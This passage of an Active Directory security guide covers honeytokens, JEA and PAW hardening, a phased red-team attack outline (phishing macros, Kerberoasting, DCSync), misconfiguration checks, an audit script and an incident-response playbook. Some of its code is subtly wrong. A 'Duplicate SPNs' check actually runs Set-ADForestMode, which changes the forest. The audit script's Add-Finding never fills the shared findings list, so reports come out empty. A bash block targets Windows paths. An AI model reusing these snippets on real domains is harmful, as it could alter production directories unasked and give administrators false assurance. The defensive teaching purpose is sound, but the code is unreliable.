    [System.Security.AccessControl.AuditFlags]::Success
)
$User = [ADSI]"LDAP://$HoneypotDN"
$User.ObjectSecurity.AddAuditRule($AuditRule)
$User.CommitChanges()

# Set up alerting for any authentication attempts
# Configure SIEM rule: Alert on successful/failed auth for svc_backup_admin
```

**Honeytoken Deployment**

```bash
# Deploy fake credentials as tripwires
# Place fake credentials in common locations attackers search

# Fake KeePass database
cp honeytoken.kdbx C:\Users\Administrator\Documents\passwords.kdbx

# Fake credential files
echo "admin:FakePassword123!" > C:\temp\creds.txt
echo "DOMAIN\backup_svc:NotReal456!" > C:\Users\Public\Desktop\notes.txt

# Configure monitoring for access to these files
# Windows Event ID 4663 (Object Access)
# Sysmon Event ID 11 (FileCreate)
```

### Advanced Defensive Measures

**Just Enough Administration (JEA)**

```powershell
# JEA endpoint configuration for privileged access restriction
# Create session configuration

$JEAConfig = @{
    SessionType = 'RestrictedRemoteServer'
    RunAsVirtualAccount = $true
    TranscriptDirectory = 'C:\ProgramData\JEA\Transcripts'
    RoleDefinitions = @{
        'DOMAIN\HelpDesk' = @{ RoleCapabilities = 'HelpDesk' }
        'DOMAIN\ServerOperators' = @{ RoleCapabilities = 'ServerMaintenance' }
    }
}

New-PSSessionConfigurationFile -Path 'C:\Program Files\WindowsPowerShell\Modules\JEA\RoleCapabilities\JEAConfig.pssc' @JEAConfig

# Create role capability file
$RoleCapability = @{
    VisibleCmdlets = 'Restart-Service', 'Get-Service', 'Get-Process'
    VisibleFunctions = '*'
    VisibleExternalCommands = 'C:\Windows\System32\ipconfig.exe'
}
New-PSRoleCapabilityFile -Path 'C:\Program Files\WindowsPowerShell\Modules\JEA\RoleCapabilities\HelpDesk.psrc' @RoleCapability

# Register JEA endpoint
Register-PSSessionConfiguration -Name 'HelpDeskJEA' -Path 'C:\Program Files\WindowsPowerShell\Modules\JEA\RoleCapabilities\JEAConfig.pssc'
```

**Privileged Access Workstations (PAW)**

```powershell
# PAW security configuration script
# Run on dedicated administrative workstations

# Disable network adapters except for management network
Get-NetAdapter | Where-Object {$_.Name -notlike "*Management*"} | Disable-NetAdapter -Confirm:$false

# Restrict USB storage
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\USBSTOR" -Name "Start" -Value 4

# Enable Device Guard/Credential Guard
# (Requires hardware and software prerequisites)

# Configure AppLocker for PAW
New-AppLockerPolicy -RuleType Path, Hash, Publisher -User Everyone -Action Allow

# Restrict admin logon to PAW only
# Configure user rights assignment: Deny log on locally/remote for admin accounts
```

### Attack Simulation Scenarios

**Real-World Attack Chain Walkthrough**

```markdown
## Scenario: APT-Style Attack Simulation

### Phase 1: Initial Access (Week 1)
**Objective**: Gain foothold via phishing

Day 1-2: Reconnaissance
- Harvest email addresses from LinkedIn
- Identify software stack from job postings
- Map external infrastructure

Day 3-4: Payload Development
- Create themed phishing emails (HR policy update)
- Develop malicious macro document
- Test against client AV/EDR

Day 5: Execution
- Send targeted phishing to 10 employees
- Establish callback on successful execution
- Deploy initial persistence

### Phase 2: Discovery (Week 2)
**Objective**: Map network and identify targets

- Internal network enumeration
- BloodHound data collection
- Identify privileged users
- Locate sensitive data repositories

### Phase 3: Privilege Escalation (Week 3)
**Objective**: Obtain Domain Admin

Day 1: Local privilege escalation on workstation
Day 2-3: Kerberoasting service accounts
Day 4: AS-REP roasting for accounts without pre-auth
Day 5: DCSync attack with cracked credentials

### Phase 4: Lateral Movement (Week 4)
**Objective**: Access critical systems

- Move to domain controller
- Compromise backup systems
- Access file shares containing sensitive data
- Enumerate cloud integrations

### Phase 5: Exfiltration Simulation (Week 5)
**Objective**: Demonstrate data access

- Identify customer database
- Generate report of accessible records (do not exfiltrate actual data)
- Document pathways for data exfiltration
- Test detection capabilities

### Phase 6: Reporting (Week 6)
**Objective**: Deliver findings and recommendations

- Executive presentation
- Technical findings workshop
- Remediation roadmap
- Purple team exercise planning
```

### Common Active Directory Misconfigurations

**Default GPO and Security Settings**

```powershell
# Check for common misconfigurations

# 1. Password Policy Weaknesses
Get-ADDefaultDomainPasswordPolicy | Select-Object `
    MinPasswordLength, `
    PasswordHistoryCount, `
    MaxPasswordAge, `
    MinPasswordAge, `
    ComplexityEnabled

# 2. Anonymous LDAP Access
$RootDSE = Get-ADRootDSE
$LDAPSecurity = Get-ACL "AD:\$($RootDSE.defaultNamingContext)"
$LDAPSecurity.Access | Where-Object {$_.IdentityReference -like "*ANONYMOUS*"}

# 3. AdminSDHolder Protected Accounts
# Check for accounts with AdminCount=1 that shouldn't have it
Get-ADUser -LDAPFilter "(admincount=1)" -Properties AdminCount, MemberOf | `
    Where-Object {$_.MemberOf -notmatch "Admin|Operator"} | `
    Select-Object Name, AdminCount, MemberOf

# 4. SPNs on User Accounts (Kerberoast targets)
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName | `
    Select-Object Name, ServicePrincipalName

# 5. Unconstrained Delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | `
    Select-Object Name, TrustedForDelegation

# 6. Duplicate SPNs (causes authentication issues)
Set-ADForestMode -Identity (Get-ADDomain).Forest -Server (Get-ADDomain).PDCEmulator
```

**Certificate Services Misconfigurations**

```bash
# Check for common ADCS issues

# ESC8 - Web Enrollment HTTP
# Check if CA web enrollment is available over HTTP
curl -I http://ca-server/certsrv

# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -config "CA-Server\CA-Name" -getreg policy\EditFlags
# If 0x00040000 (EDITF_ATTRIBUTESUBJECTALTNAME2) is set, vulnerable

# Weak certificate templates
certutil -template | Select-String -Pattern "Client Authentication"
# Check for templates that allow:
# - Client Authentication EKU
# - No manager approval
# - Enrollable by domain users
# - Allows subjectAltName specification
```

### Defensive PowerShell for AD Security

**Active Directory Security Audit Script**

```powershell
<#
.SYNOPSIS
    Active Directory Security Audit Script
.DESCRIPTION
    Performs comprehensive security audit of AD environment
    Outputs findings with severity ratings
#>

[CmdletBinding()]
param(
    [string]$OutputPath = "AD-Security-Audit-$(Get-Date -Format 'yyyyMMdd').html"
)

# Initialize findings collection
$Findings = @()

function Add-Finding {
    param(
        [string]$Category,
        [string]$Description,
        [string]$Severity, # Critical, High, Medium, Low, Info
        [string]$Recommendation,
        [string]$Reference
    )
    
    $Findings += [PSCustomObject]@{
        Category = $Category
        Description = $Description
        Severity = $Severity
        Recommendation = $Recommendation
        Reference = $Reference
        Timestamp = Get-Date
    }
}

# Check 1: Domain Functional Level
$Domain = Get-ADDomain
if ($Domain.DomainMode -lt "Windows2012R2Domain") {
    Add-Finding -Category "Domain Configuration" `
        -Description "Domain functional level is $($Domain.DomainMode). Consider upgrading for improved security features." `
        -Severity "Medium" `
        -Recommendation "Upgrade domain functional level to Windows Server 2016 or later" `
        -Reference "https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels"
}

# Check 2: Password Policy
$PasswordPolicy = Get-ADDefaultDomainPasswordPolicy
if ($PasswordPolicy.MinPasswordLength -lt 14) {
    Add-Finding -Category "Password Policy" `
        -Description "Minimum password length is only $($PasswordPolicy.MinPasswordLength) characters" `
        -Severity "High" `
        -Recommendation "Increase minimum password length to 14 characters or more; consider passphrases" `
        -Reference "NIST SP 800-63B"
}

# Check 3: Privileged Group Membership
$DomainAdmins = Get-ADGroupMember "Domain Admins" -Recursive
if ($DomainAdmins.Count -gt 5) {
    Add-Finding -Category "Privileged Access" `
        -Description "Domain Admins group contains $($DomainAdmins.Count) members" `
        -Severity "Medium" `
        -Recommendation "Implement Privileged Access Management (PAM) and reduce DA membership" `
        -Reference "https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access"
}

# Check 4: Service Accounts with SPNs
$ServiceAccounts = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties PasswordLastSet
$OldServiceAccounts = $ServiceAccounts | Where-Object {
    $_.PasswordLastSet -lt (Get-Date).AddDays(-365)
}
if ($OldServiceAccounts) {
    Add-Finding -Category "Service Accounts" `
        -Description "$($OldServiceAccounts.Count) service accounts have not changed passwords in over 1 year" `
        -Severity "High" `
        -Recommendation "Implement gMSAs or enforce regular password rotation for service accounts" `
        -Reference "https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview"
}

# Check 5: SMBv1 Protocol
$SMB1Enabled = Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
if ($SMB1Enabled.State -eq "Enabled") {
    Add-Finding -Category "Protocol Security" `
        -Description "SMBv1 protocol is enabled" `
        -Severity "Critical" `
        -Recommendation "Disable SMBv1 immediately - vulnerable to multiple exploits including EternalBlue" `
        -Reference "MS17-010"
}

# Check 6: LDAP Signing
$LDAPSigning = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -ErrorAction SilentlyContinue
if (-not $LDAPSigning -or $LDAPSigning.LDAPServerIntegrity -ne 2) {
    Add-Finding -Category "Protocol Security" `
        -Description "LDAP signing is not required" `
        -Severity "High" `
        -Recommendation "Enable LDAP signing and channel binding to prevent credential relay attacks" `
        -Reference "https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-b41c-4137-8341-a58e579e6fe2"
}

# Generate HTML Report
$Html = @"
<!DOCTYPE html>
<html>
<head>
    <title>AD Security Audit Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #333; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #4CAF50; color: white; }
        .critical { background-color: #ffcccc; }
        .high { background-color: #ffe6cc; }
        .medium { background-color: #ffffcc; }
        .low { background-color: #e6f3ff; }
        .info { background-color: #f2f2f2; }
    </style>
</head>
<body>
    <h1>Active Directory Security Audit Report</h1>
    <p>Generated: $(Get-Date)</p>
    <p>Domain: $($Domain.DNSRoot)</p>
    
    <h2>Summary</h2>
    <ul>
        <li>Critical: $($Findings | Where-Object {$_.Severity -eq 'Critical'}).Count</li>
        <li>High: $($Findings | Where-Object {$_.Severity -eq 'High'}).Count</li>
        <li>Medium: $($Findings | Where-Object {$_.Severity -eq 'Medium'}).Count</li>
        <li>Low: $($Findings | Where-Object {$_.Severity -eq 'Low'}).Count</li>
    </ul>
    
    <h2>Detailed Findings</h2>
    <table>
        <tr>
            <th>Severity</th>
            <th>Category</th>
            <th>Description</th>
            <th>Recommendation</th>
        </tr>
"@

foreach ($Finding in $Findings) {
    $Class = $Finding.Severity.ToLower()
    $Html += @"
        <tr class="$Class">
            <td>$($Finding.Severity)</td>
            <td>$($Finding.Category)</td>
            <td>$($Finding.Description)</td>
            <td>$($Finding.Recommendation)</td>
        </tr>
"@
}

$Html += @"
    </table>
</body>
</html>
"@

$Html | Out-File -FilePath $OutputPath
Write-Host "Report generated: $OutputPath"
```

### Active Directory Incident Response

**IR Playbook for AD Compromise**

```markdown
## Active Directory Compromise Response Playbook

### Detection Indicators
- DCSync activity (Event ID 4662 with DS-Replication-Get-Changes)
- Golden Ticket usage (Event ID 4624 with abnormal Logon ID)
- Mass password resets by single account
- Unusual LDAP queries from non-admin systems
- Kerberoasting activity (Event ID 4769 with RC4 encryption)

### Immediate Response (First Hour)
1. **Isolate Domain Controllers**
   - Disconnect compromised DCs from network
   - Preserve memory dumps before shutdown
   - Document all actions taken

2. **Disable Compromised Accounts**
   - Disable accounts showing suspicious activity
   - Revoke all active sessions
   - Reset passwords for suspected compromised accounts

3. **Preserve Evidence**
   - Export security logs from all DCs
   - Capture network traffic
   - Document current state before remediation

### Short-term Response (24-48 Hours)
1. **Password Reset Campaign**
   - Reset all privileged account passwords
   - Force password reset for all users
   - Reset KRBTGT password twice (invalidate Golden Tickets)

2. **Credential Rotation**
   - Rotate all service account passwords
   - Update stored credentials in applications
   - Reset LAPS passwords for all systems

3. **Access Review**
   - Review all privileged group memberships
   - Audit recent changes to AD structure
   - Verify no unauthorized accounts created

### Long-term Recovery (1-2 Weeks)
1. **Forest Recovery** (if necessary)
   - Restore from known-good backup
   - Rebuild compromised DCs
   - Validate replication health

2. **Control Implementation**
   - Deploy PAM solution
   - Implement EDR on all DCs
   - Enable advanced audit policies

3. **Security Hardening**
   - Implement tiered administration model
   - Deploy Administrative Tiering
   - Enable Privileged Access Workstations
```

The tools and techniques presented here should always be used responsibly and with proper authorization. Unauthorized access to computer systems is illegal and unethical. These methodologies are intended for legitimate security assessments, Red Team exercises, and defensive education only.
